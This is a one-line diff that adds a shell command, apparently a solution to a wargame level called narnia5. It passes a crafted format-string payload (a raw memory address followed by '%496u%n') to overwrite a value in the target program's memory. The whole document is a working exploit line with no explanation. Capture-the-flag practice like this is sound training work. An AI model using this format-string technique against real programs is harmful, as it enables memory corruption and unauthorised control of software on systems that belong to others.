@@ -1,0 +1,1 @@
+./narnia5 $(python -c 'print "\xe0\xd6\xff\xff"+ "%496u%n"')
